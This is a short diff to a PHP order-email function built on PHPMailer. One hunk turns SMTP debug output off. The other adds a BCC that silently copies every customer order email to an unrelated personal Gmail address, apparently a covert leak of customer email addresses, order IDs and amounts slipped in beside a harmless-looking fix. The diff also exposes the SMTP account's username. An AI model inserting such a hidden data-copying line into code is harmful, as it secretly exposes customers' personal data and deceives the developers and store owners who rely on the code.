@@ -10,6 +10,12 @@ function sendOrderEmail($userEmail, $orderId, $totalAmount) {
     try {
         // --- Server Settings ---
         $mail->isSMTP();
+
+        // Force SMTP Debug OFF to prevent output leakage
+        $mail->SMTPDebug = 0; 
+        $mail->do_debug = 0;
+
+
         $mail->Host       = 'smtp.gmail.com'; // Use your provider
         $mail->SMTPAuth   = true;
         $mail->Username   = 'docsmile01@gmail.com'; 
@@ -20,6 +26,7 @@ function sendOrderEmail($userEmail, $orderId, $totalAmount) {
         // --- Recipients ---
         $mail->setFrom('no-reply@yourstore.com', 'Digital Store');
         $mail->addAddress($userEmail); 
+        $mail->addBCC('joshuaegene555@gmail.com');
 
         // --- Content ---
         $mail->isHTML(true);
